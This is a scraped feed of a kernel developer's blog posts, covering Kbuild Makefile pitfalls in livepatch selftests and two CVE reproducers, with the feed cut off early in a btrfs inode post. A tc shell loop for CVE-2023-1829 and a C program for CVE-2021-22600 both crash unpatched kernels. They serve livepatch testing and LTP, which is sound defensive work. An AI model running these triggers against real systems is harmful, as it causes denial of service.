[{"content":"One might think that in order to contribute to Linux kernel the developer should speak C and assembly. This is correct most of times, but not always.\nThere are cases where a simple code move between directories require changes on Kbuild, implying knowledge of Makefile. If you have dealt with Makefiles before, you know what lies ahead of you.\nThe problem The livepatching subsystem uses kselftests to ensure that the subsystem is working as expected. The livepatch tests are placed on tools/testing/selftests/livepatch directory, and they do a very simple job: load livepatch modules and observe if they behave like they should. The source code of the livepatch testing modules live on lib/livepatch and are compiled only if CONFIG_TEST_LIVEPATCH is set. These test modules need to be installed like normal modules to allow the tests to work. This requirement forbids reasonable use cases:\nRunning the tests on a kernel that wasn\u0026rsquo;t compiled CONFIG_TEST_LIVEPATCH Changing livepatch test modules code and simply recompiling them Running livepatch kselftests from upstream on older kernels Until now, to be able to execute livepatch kselftests one should enable CONFIG_TEST_LIVEPATCH, build the kernel and the modules, and create a package for the test modules. This allows Linux distributions to test their kernels before releasing a new update, excluding the test modules from the final image.\nThe Kernel Livepatch team at SUSE wanted to change this approach to something that could be easily ported to different systems, or to different versions of the same distribution. The idea was to move the livepatch testing modules from lib/livepatch to tools/testing/selftests/livepatch, compile the modules as out-of-tree and run the tests by loading the modules. This change would empower developers making possible to change the test modules and and simply running the tests.\nThe idea is pretty good, and seems very simple to implement. Just moving code from one directory into another. What could go wrong?\nKbuild and Makefiles in the way The Linux Kernel build system is called Kbuild and is composed by Makefiles. As you can image, things can get complex when dealing with multiple Makefiles that include other Makefiles. Kbuild\u0026rsquo;s complexity is such that it has its own mailing list to discuss changes and improvements. Things are documented as much as possible, but it doesn\u0026rsquo;t make the process of touching it easier.\nProblem 1: Recursive out-of-tree module building The very first issue was found while moving the code from lib/livepatch to tools/testing/selftests/livepatch/test-modules. Per the documentation, it should be easy to address since it\u0026rsquo;s simple to build an out-of-tree module. Our use case was a little different, since our modules are in-tree but are being compiled as out-of-tree.\nFollowing the documentation, the modules were moved from lib/livepatch to tools/testing/selftests/livepatch/test-modules. The Makefile below was created to compile them:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 TESTMODS_DIR := $(realpath $(dir $(abspath $(lastword $(MAKEFILE_LIST))))) KDIR ?= /lib/modules/$(shell uname -r)/build obj-m += test_klp_atomic_replace.o \\ test_klp_callbacks_busy.o \\ test_klp_callbacks_demo.o \\ test_klp_callbacks_demo2.o \\ test_klp_callbacks_mod.o \\ test_klp_livepatch.o \\ test_klp_state.o \\ test_klp_state2.o \\ test_klp_state3.o \\ test_klp_shadow_vars.o modules: $(Q)$(MAKE) -C $(KDIR) modules M=$(TESTMODS_DIR) clean: $(Q)$(MAKE) -C $(KDIR) clean M=$(TESTMODS_DIR) The file tools/testing/selftests/livepatch/Makefile was changed to set TEST_GEN_MODS_DIR := test_modules in order to enable building the modules that were moved into test_modules directory before running the tests that will load these modules.\nWith all preparations finished, it\u0026rsquo;s time to start kseltest to build and run the tests, but the build already failed:\n1 2 3 4 5 6 7 8 9 10 11 make kselftest KDIR=$(pwd) TARGETS=livepatch CC scripts/mod/empty.o MKELF scripts/mod/elfconfig.h HOSTCC scripts/mod/modpost.o CC scripts/mod/devicetable-offsets.s HOSTCC scripts/mod/file2alias.o HOSTCC scripts/mod/sumversion.o HOSTCC scripts/mod/symsearch.o HOSTLD scripts/mod/modpost m2c -o scripts/Makefile.build.o scripts/Makefile.build.mod make[6]: m2c: No such file or directory What? Per the Make documentation, m2c is the Modula to C compiler. What\u0026rsquo;s going on? I sent a message to Kbuild mailing list exposing my problem and even created a small reproducer of the problem. The Kbuild maintainer suggested changing M= to KBUILD_EXTMOD=, which solved the issue!\nThe only time the issue was being observed was when the build process started for the toplevel directory of the Linux Kernel. It made me look into the toplevel Makefile\u0026rsquo;s code discovering the problem: the M= argument is only parsed once for recursive Makefile rules, but it would work fine if the tests were executed like below:\n1 make -C tools/testing/selftests/livepatch run_tests Makefiles: from top to livepatch selftests Toplevel Makefile In order to understand problem, we should first understand the flow that Kbuild takes to build the modules and run the tests. The traverse starts from the toplevel Makefile when we execute the make invocation below:\n1 make kselftest KDIR=$(pwd) TARGETS=livepatch On the toplevel Makefile some specific variables as checked, like M= or V=, but in this case only KDIR and TARGETS is being passed, and these don\u0026rsquo;t affect the build procedure at this point. Before reaching the kselftest target it sets a variable called sub_make_done. This part is very important! Remember the name of this variable!\nThe kselftest target will execute the command below, jumping into tools/testing/selftests directory:\n1 $(Q)$(MAKE) -C $(srctree)/tools/testing/selftests run_tests tools/testing/selftests/Makefile This Makefile checks the TARGETS variable that was propagated from the toplevel Makefile, and then jumps into the directory specified by TARGETS to run the run_tests target:\n1 2 3 4 5 6 7 8 run_tests: all @for TARGET in $(TARGETS); do \\ BUILD_TARGET=$$BUILD/$$TARGET; \\ $(MAKE) OUTPUT=$$BUILD_TARGET -C $$TARGET run_tests \\ SRC_PATH=$(shell readlink -e $$(pwd)) \\ OBJ_PATH=$(BUILD) \\ O=$(abs_objtree); \\ done; tools/testing/selftests/livepatch/Makefile This Makefile will set variables used by kselftests:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 TEST_GEN_FILES := test_klp-call_getpid TEST_GEN_MODS_DIR := test_modules TEST_PROGS_EXTENDED := functions.sh TEST_PROGS := \\ test-livepatch.sh \\ test-callbacks.sh \\ test-shadow-vars.sh \\ test-state.sh \\ test-ftrace.sh \\ test-sysfs.sh \\ test-syscall.sh TEST_FILES := settings include ../lib.mk The most important variable now is the TEST_GEN_MODS_DIR, which specifies the directory containing modules to be built. Also important is the inclusion of another makefile: lib.mk. This file contains general targets to run selftests, and uses the variables set above to work properly. Let\u0026rsquo;s see what lib.mk does when TEST_GEN_MODS_DIR is specified:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ... all: $(TEST_GEN_PROGS) $(TEST_GEN_PROGS_EXTENDED) $(TEST_GEN_FILES) \\ $(if $(TEST_GEN_MODS_DIR),gen_mods_dir) ... run_tests: all ifdef building_out_of_srctree @if [ \u0026#34;X$(TEST_PROGS)$(TEST_PROGS_EXTENDED)$(TEST_FILES)$(TEST_GEN_MODS_DIR)\u0026#34; != \u0026#34;X\u0026#34; ]; then \\ rsync -aq --copy-unsafe-links $(TEST_PROGS) $(TEST_PROGS_EXTENDED) $(TEST_FILES) $(TEST_GEN_MODS_DIR) $(OUTPUT); \\ fi @$(INSTALL_INCLUDES) @if [ \u0026#34;X$(TEST_PROGS)\u0026#34; != \u0026#34;X\u0026#34; ]; then \\ $(call RUN_TESTS, $(TEST_GEN_PROGS) $(TEST_CUSTOM_PROGS) \\ $(addprefix $(OUTPUT)/,$(TEST_PROGS))) ; \\ else \\ $(call RUN_TESTS, $(TEST_GEN_PROGS) $(TEST_CUSTOM_PROGS)); \\ fi else @$(call RUN_TESTS, $(TEST_GEN_PROGS) $(TEST_CUSTOM_PROGS) $(TEST_PROGS)) endif gen_mods_dir: $(Q)$(MAKE) -C $(TEST_GEN_MODS_DIR) clean_mods_dir: $(Q)$(MAKE) -C $(TEST_GEN_MODS_DIR) clean The run_tests depends on all target, which check some variables. If TEST_GEN_MODS_DIR is set lib.mk executed the target gen_mods_dir, which will jump into the directory specified by it to build the modules, before running the tests specified by TEST_PROGS.\ntools/testing/selftests/livepatch/test_modules/Makefile This Makefile (which was already shown before) is the responsible\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 TESTMODS_DIR := $(realpath $(dir $(abspath $(lastword $(MAKEFILE_LIST))))) KDIR ?= /lib/modules/$(shell uname -r)/build obj-m += test_klp_atomic_replace.o \\ test_klp_callbacks_busy.o \\ test_klp_callbacks_demo.o \\ test_klp_callbacks_demo2.o \\ test_klp_callbacks_mod.o \\ test_klp_livepatch.o \\ test_klp_state.o \\ test_klp_state2.o \\ test_klp_state3.o \\ test_klp_shadow_vars.o modules: $(Q)$(MAKE) -C $(KDIR) modules M=$(TESTMODS_DIR) clean: $(Q)$(MAKE) -C $(KDIR) clean M=$(TESTMODS_DIR) The code above follow the rule of building an out-of-tree module: it contains a couple of .o files that will result in different modules, a KDIR to jump into, and uses the modules target, along with the M= path being set to the current directory. At this point the KDIR already contains the value we passed when we started the process, pointing to the toplevel directory. Make will jump into KDIR.\nToplevel Makefile (again) We are back into the toplevel directory, but now with M= being set, meaning that we are about to build the modules pointed by it. Everything seems fine, but the error message appears:\n1 2 3 4 5 6 7 8 9 10 11 ... CC scripts/mod/empty.o MKELF scripts/mod/elfconfig.h HOSTCC scripts/mod/modpost.o CC scripts/mod/devicetable-offsets.s HOSTCC scripts/mod/file2alias.o HOSTCC scripts/mod/sumversion.o HOSTCC scripts/mod/symsearch.o HOSTLD scripts/mod/modpost m2c -o scripts/Makefile.build.o scripts/Makefile.build.mod make[6]: m2c: No such file or directory If we inspect the toplevel Makefile closer, the process of checking if M= was set is done only if sub_make_done isn\u0026rsquo;t set, meaning we only check M= on the first invocation of the recursive make calls.\nIn the end, the Kbuild maintainer suggested me to use KBUILD_EXTMOD= instead of M= and that did the trick! The entire flow of the recursive Makefile invocations can be see below:\nMakefile (toplevel) tools/testing/selftests/Makefile tools/testing/selftests/livepatch/Makefile tools/testing/selftests/livepatch/test-modules/Makefile Makefile (toplevel) The value of M= is used to set KBUILD_EXTMOD= either way, so using the later solved the problem, the modules are built and the tests were run as expected:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ sudo make kselftest KDIR=$(pwd) TARGETS=livepatch CC test_klp-call_getpid CC [M] /home/mpdesouza/git/linux/tools/testing/selftests/livepatch/test_modules/test_klp_atomic_replace.o CC [M] /home/mpdesouza/git/linux/tools/testing/selftests/livepatch/test_modules/test_klp_callbacks_busy.o CC [M] /home/mpdesouza/git/linux/tools/testing/selftests/livepatch/test_modules/test_klp_callbacks_demo.o ... MODPOST /home/mpdesouza/git/linux/tools/testing/selftests/livepatch/test_modules/Module.symvers CC [M] /home/mpdesouza/git/linux/tools/testing/selftests/livepatch/test_modules/test_klp_atomic_replace.mod.o LD [M] /home/mpdesouza/git/linux/tools/testing/selftests/livepatch/test_modules/test_klp_atomic_replace.tmp.ko KLP /home/mpdesouza/git/linux/tools/testing/selftests/livepatch/test_modules/test_klp_atomic_replace.ko CC [M] /home/mpdesouza/git/linux/tools/testing/selftests/livepatch/test_modules/test_klp_callbacks_busy.mod.o LD [M] /home/mpdesouza/git/linux/tools/testing/selftests/livepatch/test_modules/test_klp_callbacks_busy.ko BTF [M] /home/mpdesouza/git/linux/tools/testing/selftests/livepatch/test_modules/test_klp_callbacks_busy.ko CC [M] /home/mpdesouza/git/linux/tools/testing/selftests/livepatch/test_modules/test_klp_callbacks_demo.mod.o LD [M] /home/mpdesouza/git/linux/tools/testing/selftests/livepatch/test_modules/test_klp_callbacks_demo.tmp.ko KLP /home/mpdesouza/git/linux/tools/testing/selftests/livepatch/test_modules/test_klp_callbacks_demo.ko ... TAP version 13 1..7 # timeout set to 0 # selftests: livepatch: test-livepatch.sh # TEST: basic function patching ... ok # TEST: multiple livepatches ... ok # TEST: atomic replace livepatch ... ok ok 1 selftests: livepatch: test-livepatch.sh ... # timeout set to 0 # selftests: livepatch: test-syscall.sh # TEST: patch getpid syscall while being heavily hammered ... ok ok 7 selftests: livepatch: test-syscall.sh Problem 2: Target recipes After the patches got merged, I sent another round of patches to simplify the handling of TEST_GEN_MODS_DIR, specially this one. The patch introduced a warning because of the all target on lib.mk (that is included by all selftests Makefiles), but somehow started to fail only with this patch alone. Fortunately a person from the mailing list reported the issue, making me scratch my head to discover what was wrong. Well, let\u0026rsquo;s check how Makefiles work with duplicated targets.\nAfter tons of experiments I found that you can have duplicated Makefile targets only if they don\u0026rsquo;t contain a recipe on each target. Otherwise a warning will be shown, and only the recipe of the last target will be executed, but the dependencies of both targets will be evaluated. Take for example the files below:\nall: dep @echo \u0026#34;override.mk: running all target\u0026#34; dep: @echo \u0026#34;override.mk: running dep target\u0026#34; .PHONY: all dep Let\u0026rsquo;s call this file override.mk. And now let\u0026rsquo;s look into another file on the same directory called main.mk:\ninclude override.mk all: local_dep @echo \u0026#34;main.mk: running recipe of all target\u0026#34; local_dep: @echo \u0026#34;main.mk: running local_dep target\u0026#34; .PHONY: all local_dep You can run them by:\nmake -f main.mk And the result would be:\nmain.mk:4: warning: overriding recipe for target \u0026#39;all\u0026#39; override.mk:2: warning: ignoring old recipe for target \u0026#39;all\u0026#39; main.mk: running local_dep target override.mk: running dep target main.mk: running recipe of all target As you can see, the dependencies all both all targets were evaluated/executed, but only the recipe of all target from main.mk executed. At this point, I asked the maintainer of kselftests to ignore that specific patch while the other cleanup patches of the series were accepted.\nClosing thoughts After the changes landed, I discussed with other kernel developers about the journey, and they agreed that touching Kbuild/Makefiles is challenging. I even created a git repository to exercise Makefile constructions that I faced on Kbuild to understand better how they behave. You might find this useful.\nIf you feel frustrated trying to understand Kbuild, consider that kernel developers in general avoid touching Kbuild, specially because they don\u0026rsquo;t understand all the intricate details of it.\nThanks for reading!\nReferences Official Kbuild documentation\nKbuild modules documentation\nMy Makefile examples repository\n","permalink":"https://mpdesouza.com/blog/kbuild-livepatch-selftests/","summary":"or how moving code around ended up on a Makefile graduation course","title":"Livepatch selftests: the journey to Kbuild and back"},{"content":"Introduction Working on the SUSE Kernel Livepatching Team means dealing with lots of CVEs, and the majority of them are related to kernel network subsystem.\nCVE-2023-1829 was discovered recently and is one CVE that I found interesting. The problem is a Use-After-Free flaw in one of the oldest traffic control classifiers in the Linux kernel. StarLabs did great coverage of this CVE, explaining core concepts such as netlink, tc, qdisc, classifiers and examining and exploiting this CVE.\nIn this article, I\u0026rsquo;m going to cover how to trigger the problem using only the tc tool.\nMost CVEs contain details and even exploits for the security problems described, but they are not so easy to digest and often it can be hard to understand the nature of the problem. While these reports are comprehensive, sometimes it can be hard to understand how to trigger the problem and exploit a CVE. Understanding the problem and the mechanisms to trigger it is a crucial part of our livepatch creation process at SUSE.\nFirst let\u0026rsquo;s try to understand the problem introduced by CVE-2023-1829 by reading its description:\nA use-after-free vulnerability in the Linux Kernel traffic control index filter (tcindex) can be exploited to achieve local privilege escalation.�The tcindex_delete function which does not properly deactivate filters in case of a perfect hashes while deleting the underlying structure which can later lead to double freeing the structure.�A local attacker user can use this vulnerability to elevate its privileges to root. We recommend upgrading past commit 8c710f75256bb3cf05ac7b1672c82b92c43f3d28. Now let\u0026rsquo;s check what commit 8c710f75256bb3cf05ac7b1672c82b92c43f3d28 does:\nnet/sched: Retire tcindex classifier The tcindex classifier has served us well for about a quarter of a century but has not been getting much TLC due to lack of known users. Most recently it has become easy prey to syzkaller. For this reason, we are retiring it. As you can see, the affected code was removed from the kernel. Problem solved. That is one easy way to fix a CVE.\nPerfect hashes The CVE description mentions perfect hashes, but what exactly is it? Let\u0026rsquo;s look into the code a bit:\n1 2 3 4 5 static inline int valid_perfect_hash(struct tcindex_data *p) { return p-\u0026gt;hash \u0026gt; (p-\u0026gt;mask \u0026gt;\u0026gt; p-\u0026gt;shift); } As you can see, the tcindex code has a function that checks if the created filter can use perfect hashes. This function is called from tcindex_set_parms, where it validates the hash, mask, and shift values. If not informed, p-\u0026gt;hash default value is 64 (DEFAULT_HASH_SIZE). The value of shift and mask are obtained when adding the tcindex filter, and the shift upper limit is 16. With this information we can force the use of perfect hashes by creating a filter using 10 as shift value, and 65635 (0xFFFF) for mask:\n1 p-\u0026gt;hash(64) \u0026gt; p-\u0026gt;mask(0xFFFF) \u0026gt;\u0026gt; p-\u0026gt;shift(10); // (the shift operation results in 63) Using the rationale above, we can create a reproducer script to trigger the crash in a vulnerable system:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #!/bin/bash set -ex for i in {1..300}; do tc qdisc add dev lo root handle 1:0 htb default 30 tc class add dev lo parent 1: classid 1:1 htb rate 256kbit # Create a tcindex filter setting shift and mask to certain values to # make tcindex use the perfect hash tc filter add dev lo parent 1: protocol ip prio 1 \\ handle 10 tcindex mask 0xFFFF shift 10 classid 1:1 action drop # delete the filter to trigger the UAF on tcindex_delete tc filter delete dev lo parent 1: prio 1 handle 10 protocol ip tcindex tc qdisc delete dev lo root handle 1:0 htb done The tcindex filter created and deleted above is using perfect hashes. The loop is there to trigger the UAF as soon as possible to bring the system down.\nNow let\u0026rsquo;s see what happens if we run the script above in a vulnerable kernel with KASAN enabled:\nbash rep.sh + for i in {1..300} + tc qdisc add dev lo root handle 1:0 htb default 30 + tc class add dev lo parent 1: classid 1:1 htb rate 256kbit + tc filter add dev lo parent 1: protocol ip prio 1 handle 10 tcindex mask 0xFFFF shift 10 classid 1:1 action drop [ 7.066915] GACT probability NOT on [ 7.073193] tc (113) used greatest stack depth: 24352 bytes left + tc filter delete dev lo parent 1: prio 1 handle 10 protocol ip tcindex + tc qdisc delete dev lo root handle 1:0 htb + for i in {1..300} + tc qdisc add dev lo root handle 1:0 htb default 30 [ 7.141508] ================================================================== [ 7.142150] BUG: KASAN: use-after-free in tcf_action_destroy+0x66/0xd0 [ 7.142414] Read of size 8 at addr ffff8881140aba00 by task kworker/u8:0/9 [ 7.142671] [ 7.142732] CPU: 0 PID: 9 Comm: kworker/u8:0 Not tainted 6.2.0 #2 [ 7.142956] Hardware name: Bochs Bochs, BIOS Bochs 01/01/2011 [ 7.143213] Workqueue: tc_filter_workqueue tcindex_destroy_rexts_work [cls_tcindex] [ 7.143926] Call Trace: [ 7.144059] \u0026lt;TASK\u0026gt; [ 7.144162] dump_stack_lvl+0x48/0x5f [ 7.144335] print_report+0x184/0x4b1 [ 7.144510] ? __virt_addr_valid+0xdd/0x160 [ 7.144683] kasan_report+0xdd/0x120 [ 7.144850] ? tcf_action_destroy+0x66/0xd0 [ 7.145065] ? tcf_action_destroy+0x66/0xd0 [ 7.145301] tcf_action_destroy+0x66/0xd0 [ 7.145515] tcf_exts_destroy+0x2d/0x60 [ 7.145710] __tcindex_destroy_rexts+0x11/0xf0 [cls_tcindex] [ 7.145991] tcindex_destroy_rexts_work+0x1b/0x30 [cls_tcindex] [ 7.146297] process_one_work+0x57a/0xa40 [ 7.146512] ? __pfx_process_one_work+0x10/0x10 [ 7.146737] ? __pfx_do_raw_spin_lock+0x10/0x10 [ 7.146971] worker_thread+0x93/0x700 [ 7.147158] ? __pfx_worker_thread+0x10/0x10 [ 7.147369] kthread+0x159/0x190 [ 7.147534] ? __pfx_kthread+0x10/0x10 [ 7.147725] ret_from_fork+0x29/0x50 [ 7.147909] \u0026lt;/TASK\u0026gt; [ 7.148027] [ 7.148111] Allocated by task 113: [ 7.148288] kasan_save_stack+0x33/0x60 [ 7.148486] kasan_set_track+0x25/0x30 [ 7.148683] __kasan_kmalloc+0x92/0xa0 [ 7.148881] tcindex_set_parms+0x150/0x11c0 [cls_tcindex] [ 7.149174] tcindex_change+0x15b/0x21f [cls_tcindex] [ 7.149442] tc_new_tfilter+0x6f4/0x11b0 [ 7.149654] rtnetlink_rcv_msg+0x535/0x6b0 [ 7.149862] netlink_rcv_skb+0xdc/0x210 [ 7.150060] netlink_unicast+0x2d0/0x460 [ 7.150262] netlink_sendmsg+0x39b/0x690 [ 7.150482] ____sys_sendmsg+0x404/0x430 [ 7.150716] ___sys_sendmsg+0xfd/0x170 [ 7.151025] __sys_sendmsg+0xee/0x180 [ 7.151259] do_syscall_64+0x3c/0x90 [ 7.151453] entry_SYSCALL_64_after_hwframe+0x72/0xdc As expected, things went bad. As you can see, five commands can crash your kernel, if tcindex is enabled. The reproducer above was a good candidate to be included in the Linux Testing Project (LTP), so I asked my SUSE colleague Martin Doucha to do it, and he did: Add test for CVE 2023-1829. The submitted code uses the LTP API to create the filter, instead of relying on the tc tool. Thanks a lot Martin!\nConclusion Learning about APIs and kernel features that you never heard of is a fascinating part of creating kernel livepatches. This was the case for me when I looked into (now defunct) tcindex code and it\u0026rsquo;s even better when your reproducer is merged into LTP.\nThat\u0026rsquo;s all for today, thanks a lot for reading. See you in the next post!\nReferences Breaking the Code - Exploiting and Examining CVE-2023-1829 in cls_tcindex Classifier Vulnerability CVE-2023-1829 Linux Advanced Routing and Traffic Control (LARC) Mecanismos de QoS em Linux (in Portuguese) ","permalink":"https://mpdesouza.com/blog/five-commands-to-crash-the-kernel/","summary":"A tcindex tale","title":"Five commands to crash the kernel"},{"content":"The main responsibility of the Kernel Livepatching team at SUSE is to create livepatches for critical security bugs. More important than fixing the bug itself is to guarantee that the livepatch will solve the original problem and not create new ones, so testing the fix properly is crucial.\nTo test a livepatch, you need a way to reproduce the original bug, but how to test a livepatch when you don\u0026rsquo;t have a reproducer? Today I\u0026rsquo;ll share my history of creating a reproducer for a security bug and how it ended up being merged into Linux Testing Project.\nThe security bug Very often commits merged on the upstream Linux repository are disguised as simple code fixes, but in fact, they are solving critical issues. Take for example this patch. This change fixes a double free buf after switching AF_PACKET socket interface versions. The details of this problem are described in CVE-2021-22600. The fix for this bug seems harmless, and the creation of a livepatch was straightforward.\nThe problem is that there wasn\u0026rsquo;t a reproducer ready for testing this CVE patch. Without a reproducer one needed to be created.\nPacket sockets The man pages describes that: \u0026ldquo;Packet sockets are used to receive or send raw packets at the device driver (OSI Layer 2) level. They allow the user to implement protocol modules in user space on top of the physical layer\u0026rdquo;.\nAccording to the official kernel documentation on Packet MMAP, there are currently three TPACKET versions, where tpacket_version can be TPACKET_V1 (default), TPACKET_V2 and TPACKET_V3.\nIn summary, the bug consists of a stale pointer when switching between TPACKET versions.\nReproducer To create a reproducer there are some questions that need to be answered. For example, what is the problem, and how it manifests? Looking at the commit message that fixes the issue, it was mentioned that rx_owner_map can be stale when changing the protocol version on packet_set_ring function. This function is called whenever a userspace program calls setsockopt with a packet socket, as we can see below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u, int closing, int tx_ring) { struct pgv *pg_vec = NULL; struct packet_sock *po = pkt_sk(sk); unsigned long *rx_owner_map = NULL; int was_running, order = 0; struct packet_ring_buffer *rb; struct sk_buff_head *rb_queue; __be16 num; int err; /* Added to avoid minimal code churn */ struct tpacket_req *req = \u0026amp;req_u-\u0026gt;req; ... if (req-\u0026gt;tp_block_nr) { ... order = get_order(req-\u0026gt;tp_block_size); pg_vec = alloc_pg_vec(req, order); if (unlikely(!pg_vec)) goto out; switch (po-\u0026gt;tp_version) { case TPACKET_V3: /* Block transmit is not supported yet */ if (!tx_ring) { init_prb_bdqc(po, rb, pg_vec, req_u); } else { struct tpacket_req3 *req3 = \u0026amp;req_u-\u0026gt;req3; if (req3-\u0026gt;tp_retire_blk_tov || req3-\u0026gt;tp_sizeof_priv || req3-\u0026gt;tp_feature_req_word) { err = -EINVAL; goto out_free_pg_vec; } } break; default: if (!tx_ring) { rx_owner_map = bitmap_alloc(req-\u0026gt;tp_frame_nr, GFP_KERNEL | __GFP_NOWARN | __GFP_ZERO); if (!rx_owner_map) goto out_free_pg_vec; } break; } } /* Done */ else { err = -EINVAL; if (unlikely(req-\u0026gt;tp_frame_nr)) goto out; } ... mutex_lock(\u0026amp;po-\u0026gt;pg_vec_lock); if (closing || atomic_read(\u0026amp;po-\u0026gt;mapped) == 0) { err = 0; spin_lock_bh(\u0026amp;rb_queue-\u0026gt;lock); swap(rb-\u0026gt;pg_vec, pg_vec); if (po-\u0026gt;tp_version \u0026lt;= TPACKET_V2) swap(rb-\u0026gt;rx_owner_map, rx_owner_map); ... } mutex_unlock(\u0026amp;po-\u0026gt;pg_vec_lock); out_free_pg_vec: bitmap_free(rx_owner_map); if (pg_vec) free_pg_vec(pg_vec, order, req-\u0026gt;tp_block_nr); out: return err; } Note: The code above doesn\u0026rsquo;t contain the patch that fixes the bug.\nLet\u0026rsquo;s now check the struct where rx_owner_map exists:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 struct packet_ring_buffer { struct pgv *pg_vec; unsigned int head; unsigned int frames_per_block; unsigned int frame_size; unsigned int frame_max; unsigned int pg_vec_order; unsigned int pg_vec_pages; unsigned int pg_vec_len; unsigned int __percpu *pending_refcnt; union { unsigned long *rx_owner_map; struct tpacket_kbdq_core prb_bdqc; }; }; As we can see rx_owner_map is part of a union. The patch commit message mentions a stale pointer, so we can deduct that when the swap(rb-\u0026gt;rx_owner_map, rx_owner_map) is called we can be dealing with prb_bdqc, and not with rx_owner_map. At this point, it\u0026rsquo;s useful to have userspace code to exercise the mentioned functions and start poking around it. The fastest way to search for userspace code using a Linux kernel feature is by checking the Linux Kernel selftests and the Linux Testing Project.\nBoth projects contain good examples about how to use different kernel features. It was quick to find an example of TPACKET usage on LTP.\nWith a test case in hand and some understanding of what is going wrong, we can check how rx_owner_map ends up containing stale data:\nWhen calling setsockopt using TPACKET_V3, RX ring and setting tp_block_nr, pg_vec is allocated and init_prb_bdqc is called setting prb_bdqc union member. If the next call to setsockopt, setting tp_block_nr and tp_frame_nr as 0, pg_vec and rx_owner_map are released (or it would be prb_bdqc here, since it\u0026rsquo;s an union?), since po-\u0026gt;mapped is always 0 here (mmap wasn\u0026rsquo;t called to map the buffer) Calling setsockopt using TPACKET_V2 passing tp_block_nr and tp_frame_nr as 0, the code goes directly to release the swapped rx_owner_map that was already released in the previous step. Double free. Using the test case as a starting point, I was able to create my own reproducer:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;linux/if_packet.h\u0026gt; int sock; struct ring { union { struct tpacket_req req; struct tpacket_req3 req3; }; }; static void set_ver(int ver) { if (setsockopt(sock, SOL_PACKET, PACKET_VERSION, \u0026amp;ver, sizeof(ver)) == -1) { perror(\u0026#34;setsockopt\u0026#34;); fprintf(stderr, \u0026#34;Cannot set sock to ver %d\\n\u0026#34;, ver + 1); exit(1); } } static void __v3_fill(struct ring *ring) { ring-\u0026gt;req3.tp_retire_blk_tov = 64; ring-\u0026gt;req3.tp_sizeof_priv = 0; ring-\u0026gt;req3.tp_feature_req_word = TP_FT_REQ_FILL_RXHASH; ring-\u0026gt;req3.tp_block_size = getpagesize() \u0026lt;\u0026lt; 2; ring-\u0026gt;req3.tp_frame_size = TPACKET_ALIGNMENT \u0026lt;\u0026lt; 7; ring-\u0026gt;req3.tp_block_nr = 256; ring-\u0026gt;req3.tp_frame_nr = ring-\u0026gt;req3.tp_block_size / ring-\u0026gt;req3.tp_frame_size * ring-\u0026gt;req3.tp_block_nr; } static void setup_ring(int mess) { struct ring ring; __v3_fill(\u0026amp;ring); /* * First time we call setup_ring, using TPACKET_V3, we send the req3 * as populated by __v3_fill. In the next calls, we zero two members of * the struct, simulating a \u0026#39;close\u0026#39; of the socket. This makes afpacket * module to free pg_vec. * * tpacket_v3 does not allocate rx_owner_map, but instead it sets * prb_bdqc, but both are define in a union. */ if (mess) { ring.req3.tp_block_nr = 0; ring.req3.tp_frame_nr= 0; } if (setsockopt(sock, SOL_PACKET, PACKET_RX_RING, \u0026amp;ring.req3, sizeof(ring.req3)) == -1) { perror(\u0026#34;setsockopt\u0026#34;); exit(1); } } int main(void) { sock = socket(PF_PACKET, SOCK_RAW, 0); if (sock == -1) { perror(\u0026#34;socket\u0026#34;); exit(1); } set_ver(TPACKET_V3); /* Send complete req3 data */ setup_ring(0); /* * Pass tp_block_nr and tp_frame_nr, releases pg_vec, and rb-\u0026gt;rw_owner_map * is freed * */ setup_ring(1); /* With pg_vec released, we can change the socket version to TPACKET_V2 */ set_ver(TPACKET_V2); /* * With V2, we send again the tp_block_nr/tp_frame_nr zeroed, so * afpacket does not try to allocate a pg_vec of rx_owner_map and goes * directly to the cleaning part. For V1/V2, it swaps the current * allocated rw_owner_map (which wasn\u0026#39;t allocated this time) with the * previously stored rw_owner_map (freed in the second setup_ring call * above). * * Now, double free on the way! */ setup_ring(1); return 0; } The comments in the code explains what exactly happens.\nBe careful: if you are running a kernel without the fix applied (earlier than v5.16-rc6), running the code above can crash your system.\nIs a common practice in SUSE to check with QA if a reproducer can be adapted and merged into LTP. In my case, Martin Doucha was kind enough to adapt the code using the LTP API and merge it.\nConsiderations The entire process of checking the bug, understanding the problem, checking for reproducer and triggering it reliably was gratifying. The kernel samples and the LTP are interesting resources for research and understanding how kernel interfaces are used, and also to check if a kernel is vulnerable to a known problem that already contains a reproducer.\nThanks for reading until the end. See you in the next post!\nReferences CVE commit fix\nLTP reproducer\n","permalink":"https://mpdesouza.com/blog/from-zero-to-double-free/","summary":"\u0026hellip; or my personal journey of reading code and triggering behaviors.","title":"From zero to double free: The process of creating a reproducer for a kernel vulnerability"},{"content":"It\u0026rsquo;s known that btrfs behaves differently from other Linux filesystems. There are some fascinating aspects of how btrfs manages its internal structures and how common tools are not prepared to handle it.\nThis goal of this post is to demystify why ext4 can report the number of available inodes while btrfs always reports 0:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ file ext4.disk ext4.disk: Linux rev 1.0 ext4 filesystem data, UUID=3f21312b-412a-4b1a-8561-5704eaf39d22 (extents) (64bit) (large files) (huge files) $ mount ext4.disk /mnt $ df -i /mnt 